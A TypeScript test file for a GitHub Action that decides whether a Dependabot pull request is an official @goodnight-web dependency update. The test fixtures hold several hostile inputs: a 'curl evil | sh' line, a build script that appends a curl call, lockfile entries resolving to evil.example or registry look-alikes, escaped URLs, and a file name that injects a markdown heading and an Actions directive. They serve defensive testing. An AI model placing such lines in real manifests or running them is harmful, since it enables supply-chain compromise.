import { describe, expect, test } from 'bun:test';
import {
  MARKER,
  STATUS_CONTEXT,
  buildComment,
  classifyUpdate,
  clean,
  run,
} from './update-check.cjs';

type PullRequest = Parameters<typeof classifyUpdate>[0];
type ChangedFile = Parameters<typeof classifyUpdate>[1][number];
type Commit = Parameters<typeof classifyUpdate>[2][number];

const BOT = { login: 'dependabot[bot]' };

function commit(overrides: Partial<Commit> = {}): Commit {
  return {
    sha: '0123456789abcdef',
    author: BOT,
    committer: BOT,
    commit: { verification: { verified: true } },
    ...overrides,
  };
}

const REPO = 'example-co/website';

function pullRequest(overrides: Partial<PullRequest> = {}): PullRequest {
  return {
    number: 7,
    user: { login: 'dependabot[bot]', type: 'Bot' },
    head: { sha: '0123456789abcdef', repo: { full_name: REPO } },
    base: { repo: { full_name: REPO } },
    ...overrides,
  };
}

// Like the API, `additions` and `deletions` default to the counts of the
// whole diff.
function modified(
  filename: string,
  patch: string,
  totals: { additions: number; deletions: number } = countLines(patch),
): ChangedFile {
  return { filename, status: 'modified', patch, ...totals };
}

function countLines(patch: string) {
  const lines = patch.split('\n').filter((line) => !line.startsWith('@@'));
  return {
    additions: lines.filter((line) => line.startsWith('+')).length,
    deletions: lines.filter((line) => line.startsWith('-')).length,
  };
}

// The event payload reports `changed_files` and `commits`; by default they
// match the lists. By default the pull request has one Dependabot commit.
function classify(
  pr: PullRequest,
  files: ChangedFile[],
  commits: Commit[] = [commit()],
) {
  return classifyUpdate(
    { changed_files: files.length, commits: commits.length, ...pr },
    files,
    commits,
  );
}

const packageJsonPatch = `@@ -11,7 +11,7 @@
     "preview": "astro preview"
   },
   "dependencies": {
-    "@goodnight-web/server": "0.1.0",
+    "@goodnight-web/server": "0.1.1",
     "astro": "7.4.1"
   },
   "devDependencies": {`;

const packageLockPatch = `@@ -8,7 +8,7 @@
       "name": "website",
       "version": "0.0.0",
       "dependencies": {
-        "@goodnight-web/server": "0.1.0",
+        "@goodnight-web/server": "0.1.1",
         "astro": "7.4.1"
       },
       "devDependencies": {
@@ -120,9 +120,9 @@
       }
     },
     "node_modules/@goodnight-web/server": {
-      "version": "0.1.0",
-      "resolved": "https://registry.npmjs.org/@goodnight-web/server/-/server-0.1.0.tgz",
-      "integrity": "sha512-AAAA",
+      "version": "0.1.1",
+      "resolved": "https://registry.npmjs.org/@goodnight-web/server/-/server-0.1.1.tgz",
+      "integrity": "sha512-BBBB",
       "license": "MIT",
       "dependencies": {
         "hono": "4.13.13"`;

describe('classifyUpdate', () => {
  test('official Dependabot patch update of @goodnight-web/server', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      modified('package-lock.json', packageLockPatch),
    ]);
    expect(result).toEqual({ official: true, reasons: [] });
  });

  test('Dependabot update that also changes other dependencies', () => {
    const result = classify(pullRequest(), [
      modified(
        'package.json',
        `@@ -11,4 +11,4 @@
   "dependencies": {
-    "@goodnight-web/server": "0.1.0",
-    "astro": "7.4.1"
+    "@goodnight-web/server": "0.1.1",
+    "astro": "7.5.0"
   },`,
      ),
      modified('package-lock.json', packageLockPatch),
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toEqual([
      'package.json: entry other than an @goodnight-web/* dependency changed: astro',
    ]);
  });

  test('lockfile changes to dependencies of @goodnight-web/server are allowed', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      modified(
        'package-lock.json',
        `${packageLockPatch}
@@ -400,3 +400,3 @@
     "node_modules/hono": {
-      "version": "4.13.13",
+      "version": "4.13.14",
       "license": "MIT",`,
      ),
    ]);
    expect(result).toEqual({ official: true, reasons: [] });
  });

  test('a bun.lock diff that GitHub did not include is allowed', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      { filename: 'bun.lock', status: 'modified' },
    ]);
    expect(result).toEqual({ official: true, reasons: [] });
  });

  test('a package-lock.json diff that GitHub did not include is not official', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      { filename: 'package-lock.json', status: 'modified' },
    ]);
    expect(result.reasons).toEqual([
      'the diff of package-lock.json is not available',
    ]);
  });

  test('a package-lock.json diff with a left-out hunk is not official', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      modified('package-lock.json', packageLockPatch, {
        additions: 9,
        deletions: 4,
      }),
    ]);
    expect(result.reasons).toEqual([
      'the diff of package-lock.json is incomplete',
    ]);
  });

  const lockfileWith = (line: string) => `@@ -120,3 +120,3 @@
     "node_modules/@goodnight-web/server": {
-      "version": "0.1.0",
+      ${line}
       "license": "MIT",`;

  test.each([
    [
      'another registry',
      '"resolved": "https://evil.example/@goodnight-web/server/-/server-0.1.1.tgz",',
      'URL outside https://registry.npmjs.org/',
    ],
    [
      'a git+ URL',
      '"resolved": "git+ssh://git@github.com/evil/server.git#abc",',
      'entry not from the npm registry',
    ],
    [
      'a file: path',
      '"resolved": "file:../server",',
      'entry not from the npm registry',
    ],
    ['a link entry', '"link": true,', 'entry not from the npm registry'],
    [
      'plain http',
      '"resolved": "http://registry.npmjs.org/a/-/a-1.0.0.tgz",',
      'entry not from the npm registry',
    ],
    [
      'a sha1 integrity',
      '"integrity": "sha1-AAAA",',
      'integrity is not sha512',
    ],
    [
      'a registry look-alike',
      '"resolved": "https://registry.npmjs.org.evil.example/a/-/a-1.0.0.tgz",',
      'URL outside https://registry.npmjs.org/',
    ],
    [
      'JSON escapes that hide the key and the URL',
      '"\\u0072esolved": "https:\\/\\/evil.example\\/pkg.tgz",',
      'escape sequence',
    ],
    [
      'a line that is not lockfile content',
      'curl evil | sh',
      'unexpected line',
    ],
  ])(
    'a package-lock.json entry with %s is not official',
    (_name, line, reason) => {
      const result = classify(pullRequest(), [
        modified('package.json', packageJsonPatch),
        modified('package-lock.json', lockfileWith(line)),
      ]);
      expect(result.official).toBe(false);
      expect(result.reasons.join('\n')).toContain(reason);
    },
  );

  test('a real new lockfile entry with funding links is official', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      modified(
        'package-lock.json',
        `@@ -500,0 +500,16 @@
+    "node_modules/new-dep": {
+      "version": "1.2.3",
+      "resolved": "https://registry.npmjs.org/new-dep/-/new-dep-1.2.3.tgz",
+      "integrity": "sha512-q83XyMOzG0a/8r9fEQDOIvKBxxk1SrNkEKzXz7HsGdFO+3OW2RimuJdLaw4w6VMpvT6S+zqIWZ5RX0NNHkAg+A==",
+      "license": "MIT",
+      "engines": {
+        "node": ">=18"
+      },
+      "funding": [
+        "https://github.com/sponsors/someone",
+        {
+          "type": "opencollective",
+          "url": "https://opencollective.com/new-dep"
+        }
+      ]
+    },`,
      ),
    ]);
    expect(result).toEqual({ official: true, reasons: [] });
  });

  test.each([
    ['a dependency named url', '"url": "git+https://evil.example/url.git"'],
    ['a dependency named type', '"type": "github:evil/type"'],
    [
      'a dependency named url with a tarball',
      '"url": "https://evil.example/u.tgz"',
    ],
    [
      'a funding key with a git URL',
      '"funding": "git+https://evil.example/f.git"',
    ],
  ])('a lockfile line with %s is not official', (_name, line) => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      modified(
        'package-lock.json',
        `@@ -500,0 +500,3 @@
+      "dependencies": {
+        ${line}
+      }`,
      ),
    ]);
    expect(result.official).toBe(false);
  });

  test('a funding link given as a string is official', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      modified(
        'package-lock.json',
        `@@ -500,0 +500,1 @@
+      "funding": "https://github.com/sponsors/someone",`,
      ),
    ]);
    expect(result).toEqual({ official: true, reasons: [] });
  });

  test('a git URL in another lockfile is not official', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      modified(
        'bun.lock',
        `@@ -1,1 +1,1 @@
-    "hono": ["hono@4.13.13", "", {}, "sha512-AAAA"],
+    "hono": ["hono@github:evil/hono", "", {}, ""],`,
      ),
    ]);
    expect(result.reasons.join('\n')).toContain(
      'bun.lock: entry not from the npm registry',
    );
  });

  test('a commit by another author is not official', () => {
    const result = classify(
      pullRequest(),
      [modified('package.json', packageJsonPatch)],
      [commit({ sha: 'bad0000', author: { login: 'mallory' } }), commit()],
    );
    expect(result.reasons).toEqual([
      'commit bad0000: author is not dependabot[bot]: mallory',
    ]);
  });

  test('a commit pushed by another committer is not official', () => {
    const result = classify(
      pullRequest(),
      [modified('package.json', packageJsonPatch)],
      [commit({ sha: 'bad0000', committer: { login: 'mallory' } }), commit()],
    );
    expect(result.reasons).toEqual([
      'commit bad0000: committer is not dependabot[bot]: mallory',
    ]);
  });

  test('a commit made in the GitHub web interface is not official', () => {
    const result = classify(
      pullRequest(),
      [modified('package.json', packageJsonPatch)],
      [commit({ sha: 'bad0000', committer: { login: 'web-flow' } }), commit()],
    );
    expect(result.reasons).toEqual([
      'commit bad0000: committer is not dependabot[bot]: web-flow',
    ]);
  });

  test('a commit without a linked GitHub account is not official', () => {
    const result = classify(
      pullRequest(),
      [modified('package.json', packageJsonPatch)],
      [commit({ sha: 'bad0000', author: null, committer: null }), commit()],
    );
    expect(result.reasons).toEqual([
      'commit bad0000: author is not dependabot[bot]: no GitHub account',
      'commit bad0000: committer is not dependabot[bot]: no GitHub account',
    ]);
  });

  test('a commit whose signature is not verified is not official', () => {
    const result = classify(
      pullRequest(),
      [modified('package.json', packageJsonPatch)],
      [
        commit({
          sha: 'bad0000',
          commit: { verification: { verified: false } },
        }),
        commit({ commit: {} }),
      ],
    );
    expect(result.reasons).toEqual([
      'commit bad0000: the signature is not verified by GitHub',
      'commit 0123456: the signature is not verified by GitHub',
    ]);
  });

  test('a branch that moved after the event is not official', () => {
    const result = classify(
      pullRequest(),
      [modified('package.json', packageJsonPatch)],
      [commit({ sha: 'bad0000' })],
    );
    expect(result.reasons).toEqual([
      'the branch changed while it was checked: the last commit is bad0000, the event is for 0123456',
    ]);
  });

  test('a commit list at the API limit of 250 is not official', () => {
    const commits = Array.from({ length: 250 }, () => commit());
    const result = classify(
      pullRequest(),
      [modified('package.json', packageJsonPatch)],
      commits,
    );
    expect(result.reasons).toEqual([
      'the list of commits may be incomplete: listed 250, expected 250',
    ]);
  });

  test('a commit list that does not match commits is not official', () => {
    const result = classifyUpdate(
      { ...pullRequest(), changed_files: 1, commits: 2 },
      [modified('package.json', packageJsonPatch)],
      [commit()],
    );
    expect(result.reasons).toEqual([
      'the list of commits may be incomplete: listed 1, expected 2',
    ]);
  });

  test('an empty commit list is not official', () => {
    const result = classify(
      pullRequest(),
      [modified('package.json', packageJsonPatch)],
      [],
    );
    expect(result.official).toBe(false);
  });

  test('CR, LF, and format characters in a file name are cleaned', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      {
        filename:
          'x\r\n### ✅ Official goodnight-web update\n::warning::x\u202e',
        status: 'modified',
      },
    ]);
    expect(result.official).toBe(false);
    const [reason] = result.reasons;
    expect(reason).not.toMatch(/[\r\n\u202e]/);
    expect(reason).toBe(
      'file other than package.json or a lockfile changed: x??### ✅ Official goodnight-web update?::warning::x?',
    );
    const body = buildComment(result, '0123456789');
    expect(body).not.toContain('\n### ✅ Official');
    expect(body).toContain(`- \`${reason}\``);
  });

  test('author other than dependabot[bot]', () => {
    const result = classify(
      pullRequest({ user: { login: 'someone', type: 'User' } }),
      [modified('package.json', packageJsonPatch)],
    );
    expect(result.official).toBe(false);
    expect(result.reasons).toEqual(['author is not dependabot[bot]: someone']);
  });

  test('a user account named like the bot is not official', () => {
    const result = classify(
      pullRequest({ user: { login: 'dependabot[bot]', type: 'User' } }),
      [modified('package.json', packageJsonPatch)],
    );
    expect(result.official).toBe(false);
  });

  test('branch from a fork', () => {
    const result = classify(
      pullRequest({
        head: {
          sha: '0123456789abcdef',
          repo: { full_name: 'attacker/website' },
        },
      }),
      [modified('package.json', packageJsonPatch)],
    );
    expect(result.official).toBe(false);
    expect(result.reasons).toEqual([
      'branch is not in this repository: attacker/website',
    ]);
  });

  test('branch from a deleted fork', () => {
    const result = classify(
      pullRequest({ head: { sha: '0123456789abcdef', repo: null } }),
      [modified('package.json', packageJsonPatch)],
    );
    expect(result.official).toBe(false);
  });

  test('extra files changed', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      modified('src/worker.ts', '@@ -1 +1 @@\n-a\n+b'),
      modified('.github/workflows/update-check.yml', '@@ -1 +1 @@\n-a\n+b'),
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toEqual([
      'file other than package.json or a lockfile changed: src/worker.ts',
      'file other than package.json or a lockfile changed: .github/workflows/update-check.yml',
    ]);
  });

  test('package.json in a subdirectory is an extra file', () => {
    const result = classify(pullRequest(), [
      modified('tools/package.json', packageJsonPatch),
    ]);
    expect(result.official).toBe(false);
  });

  test('lockfile-only change is not official', () => {
    const result = classify(pullRequest(), [
      modified(
        'bun.lock',
        `@@ -50,1 +50,1 @@
-    "hono": ["hono@4.13.13", "", {}, "sha512-AAAA"],
+    "hono": ["hono@4.13.14", "", {}, "sha512-BBBB"],`,
      ),
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toEqual([
      'package.json does not change an @goodnight-web/* version',
    ]);
  });

  test('package.json change outside a dependency entry', () => {
    const result = classify(pullRequest(), [
      modified(
        'package.json',
        `@@ -11,3 +11,4 @@
   "dependencies": {
     "@goodnight-web/server": "0.1.1",
+    oops
     "astro": "7.4.1"`,
      ),
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toContain(
      'package.json: change outside a dependency entry: oops',
    );
  });

  test('package.json change other than a dependency version', () => {
    const result = classify(pullRequest(), [
      modified(
        'package.json',
        `@@ -5,3 +5,3 @@
   "scripts": {
-    "build": "astro build",
+    "build": "astro build && curl https://example.com",
     "check": "astro check",`,
      ),
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toEqual([
      'package.json: entry other than an @goodnight-web/* dependency changed: build',
      'package.json does not change an @goodnight-web/* version',
    ]);
  });

  test('@goodnight-web dependency that points somewhere other than a version', () => {
    const result = classify(pullRequest(), [
      modified(
        'package.json',
        `@@ -11 +11 @@
-    "@goodnight-web/server": "0.1.0",
+    "@goodnight-web/server": "github:attacker/server",`,
      ),
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons[0]).toContain('is not set to a version number');
  });

  test('a package.json diff that GitHub did not include is not official', () => {
    const result = classify(pullRequest(), [
      { filename: 'package.json', status: 'modified' },
      modified('package-lock.json', packageLockPatch),
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toContain(
      'the diff of package.json is not available',
    );
  });

  test('a package.json hunk cut short is not official', () => {
    const truncated = packageJsonPatch.split('\n').slice(0, -2).join('\n');
    const result = classify(pullRequest(), [
      modified('package.json', truncated),
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toContain('the diff of package.json is incomplete');
  });

  test('a package.json diff with a left-out hunk is not official', () => {
    const scriptsHunk = `@@ -5,3 +5,3 @@
   "scripts": {
-    "build": "astro build",
+    "build": "astro build && curl https://example.com",
     "check": "astro check",`;
    const complete = `${scriptsHunk}\n${packageJsonPatch}`;
    expect(
      classify(pullRequest(), [modified('package.json', complete)]).official,
    ).toBe(false);

    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch, countLines(complete)),
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toContain('the diff of package.json is incomplete');
  });

  test('package.json without additions and deletions is not official', () => {
    const result = classify(pullRequest(), [
      { filename: 'package.json', status: 'modified', patch: packageJsonPatch },
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toContain('the diff of package.json is incomplete');
  });

  test('a malformed package.json diff is not official', () => {
    for (const patch of [
      '-    "@goodnight-web/server": "0.1.0",\n+    "@goodnight-web/server": "0.1.1",',
      `@@ -11 +11 @@\n-    "@goodnight-web/server": "0.1.0",\n+    "@goodnight-web/server": "0.1.1",\n+    "extra": "1.0.0",`,
      `@@ -11,1 +11 @@\n-    "@goodnight-web/server": "0.1.0",\n?    "@goodnight-web/server": "0.1.1",`,
    ]) {
      const result = classify(pullRequest(), [modified('package.json', patch)]);
      expect(result.official).toBe(false);
      expect(result.reasons).toContain(
        'the diff of package.json is incomplete',
      );
    }
  });

  test('a trailing newline and a no-newline marker are accepted', () => {
    const patch = `@@ -11 +11 @@
-    "@goodnight-web/server": "0.1.0"
\\ No newline at end of file
+    "@goodnight-web/server": "0.1.1"
\\ No newline at end of file
`;
    const result = classify(pullRequest(), [modified('package.json', patch)]);
    expect(result).toEqual({ official: true, reasons: [] });
  });

  test('a file list that does not match changed_files is not official', () => {
    const files = [modified('package.json', packageJsonPatch)];
    for (const changed_files of [2, undefined]) {
      const result = classifyUpdate(
        pullRequest({ changed_files, commits: 1 }),
        files,
        [commit()],
      );
      expect(result.official).toBe(false);
      expect(result.reasons[0]).toContain(
        'the list of changed files may be incomplete',
      );
    }
  });

  test('a file list at the API limit is not official', () => {
    const files = [
      modified('package.json', packageJsonPatch),
      ...Array.from({ length: 2999 }, () => ({
        filename: 'bun.lock',
        status: 'modified',
      })),
    ];
    const result = classify(pullRequest(), files);
    expect(result.official).toBe(false);
    expect(result.reasons).toEqual([
      'the list of changed files may be incomplete: listed 3000, expected 3000',
    ]);
  });

  test('an added lockfile is not official', () => {
    const result = classify(pullRequest(), [
      modified('package.json', packageJsonPatch),
      {
        filename: 'pnpm-lock.yaml',
        status: 'added',
        patch: '@@ -0,0 +1 @@\n+a',
      },
    ]);
    expect(result.official).toBe(false);
    expect(result.reasons).toEqual(['pnpm-lock.yaml was added, not modified']);
  });

  test('no changed files', () => {
    expect(classify(pullRequest(), []).official).toBe(false);
  });
});

describe('buildComment', () => {
  test('official comment has the marker and both languages', () => {
    const body = buildComment({ official: true, reasons: [] }, 'abcdef0123');
    expect(body.startsWith(MARKER)).toBe(true);
    expect(body).toContain('goodnight-web の公式アップデートです');
    expect(body).toContain('Official goodnight-web update');
    expect(body).toContain('abcdef0');
  });

  test('warning comment has the marker, both languages, and the reasons', () => {
    const body = buildComment(
      { official: false, reasons: ['author is not dependabot[bot]: someone'] },
      'abcdef0123',
    );
    expect(body.startsWith(MARKER)).toBe(true);
    expect(body).toContain('公式のアップデートではありません');
    expect(body).toContain("If you don't understand the changes, don't merge.");
    expect(body).toContain('- `author is not dependabot[bot]: someone`');
  });

  test('reasons are code spans with no backticks or line breaks', () => {
    const body = buildComment(
      { official: false, reasons: ['a `b`\n<img src=x>'] },
      'abcdef0123',
    );
    expect(body).toContain("- `a 'b'?<img src=x>`");
  });
});

describe('clean', () => {
  test('replaces control and format characters and cuts long text', () => {
    expect(clean('a\rb\nc\u0000d\u2028e\u200bf\u202eg')).toBe('a?b?c?d?e?f?g');
    expect(clean('x'.repeat(300))).toBe(`${'x'.repeat(200)}...`);
  });
});

describe('run', () => {
  type Comment = { id: number; body: string; user: { login: string } };

  function fakeToolkit(
    comments: Comment[],
    files: ChangedFile[] | Error,
    commits: Commit[] | Error = [commit()],
  ) {
    const calls: { method: string; params: Record<string, unknown> }[] = [];
    const listFiles = Symbol('listFiles');
    const listCommits = Symbol('listCommits');
    const listComments = Symbol('listComments');
    const toolkit = {
      github: {
        paginate: async (method: unknown) => {
          if (method === listFiles) {
            if (files instanceof Error) throw files;
            return files;
          }
          if (method === listCommits) {
            if (commits instanceof Error) throw commits;
            return commits;
          }
          return comments;
        },
        rest: {
          pulls: { listFiles, listCommits },
          repos: {
            createCommitStatus: async (params: Record<string, unknown>) => {
              calls.push({ method: 'createCommitStatus', params });
            },
          },
          issues: {
            listComments,
            createComment: async (params: Record<string, unknown>) => {
              calls.push({ method: 'createComment', params });
            },
            updateComment: async (params: Record<string, unknown>) => {
              calls.push({ method: 'updateComment', params });
            },
          },
        },
      },
      context: {
        payload: {
          pull_request: pullRequest({
            changed_files: files instanceof Error ? 1 : files.length,
            commits: commits instanceof Error ? 1 : commits.length,
          }),
        },
        repo: { owner: 'example-co', repo: 'website' },
      },
      core: { info: () => {} },
    };
    return { toolkit, calls };
  }

  const files = [modified('package.json', packageJsonPatch)];
  const comments = (calls: { method: string }[]) =>
    calls.filter((call) => call.method !== 'createCommitStatus');
  const statuses = (
    calls: { method: string; params: Record<string, unknown> }[],
  ) =>
    calls
      .filter((call) => call.method === 'createCommitStatus')
      .map((call) => call.params);

  test('creates the comment when there is none', async () => {
    const { toolkit, calls } = fakeToolkit([], files);
    const result = await run(toolkit);
    expect(result.official).toBe(true);
    expect(comments(calls)).toHaveLength(1);
    expect(calls[0]?.method).toBe('createComment');
    expect(calls[0]?.params.issue_number).toBe(7);
  });

  test('sets a success status on the head commit for an official update', async () => {
    const { toolkit, calls } = fakeToolkit([], files);
    await run(toolkit);
    expect(statuses(calls)).toEqual([
      {
        owner: 'example-co',
        repo: 'website',
        sha: '0123456789abcdef',
        context: STATUS_CONTEXT,
        state: 'success',
        description: 'Official goodnight-web update',
      },
    ]);
    expect(STATUS_CONTEXT).toBe('goodnight-web/update-check');
  });

  test('sets a failure status when the update is not official', async () => {
    const { toolkit, calls } = fakeToolkit([], files, [
      commit({ committer: { login: 'web-flow' } }),
    ]);
    const result = await run(toolkit);
    expect(result.official).toBe(false);
    expect(statuses(calls)).toMatchObject([
      { sha: '0123456789abcdef', state: 'failure' },
    ]);
  });

  test('updates its own comment instead of adding another one', async () => {
    const { toolkit, calls } = fakeToolkit(
      [
        { id: 1, body: `${MARKER}\nfake`, user: { login: 'someone' } },
        {
          id: 2,
          body: `${MARKER}\nold`,
          user: { login: 'github-actions[bot]' },
        },
      ],
      files,
    );
    await run(toolkit);
    expect(comments(calls)).toHaveLength(1);
    expect(calls[0]?.method).toBe('updateComment');
    expect(calls[0]?.params.comment_id).toBe(2);
  });

  test('does not touch an up-to-date comment, but still sets the status', async () => {
    const body = buildComment(
      { official: true, reasons: [] },
      '0123456789abcdef',
    );
    const { toolkit, calls } = fakeToolkit(
      [{ id: 2, body, user: { login: 'github-actions[bot]' } }],
      files,
    );
    await run(toolkit);
    expect(comments(calls)).toHaveLength(0);
    expect(statuses(calls)).toMatchObject([{ state: 'success' }]);
  });

  test.each([
    ['files', new Error('API rate limit exceeded'), [commit()]],
    ['commits', files, new Error('API rate limit exceeded')],
  ] as const)(
    'replaces an official comment with the warning when %s cannot be listed',
    async (_name, listedFiles, listedCommits) => {
      const official = buildComment(
        { official: true, reasons: [] },
        '0123456789abcdef',
      );
      const { toolkit, calls } = fakeToolkit(
        [{ id: 2, body: official, user: { login: 'github-actions[bot]' } }],
        listedFiles instanceof Error ? listedFiles : [...listedFiles],
        listedCommits instanceof Error ? listedCommits : [...listedCommits],
      );
      await expect(run(toolkit)).rejects.toThrow('API rate limit exceeded');
      expect(comments(calls)).toHaveLength(1);
      expect(calls[0]?.method).toBe('updateComment');
      expect(calls[0]?.params.body).toContain('This is not an official update');
      expect(calls[0]?.params.body).toContain(
        'the list of changed files or commits could not be read',
      );
      expect(statuses(calls)).toMatchObject([{ state: 'error' }]);
    },
  );
});
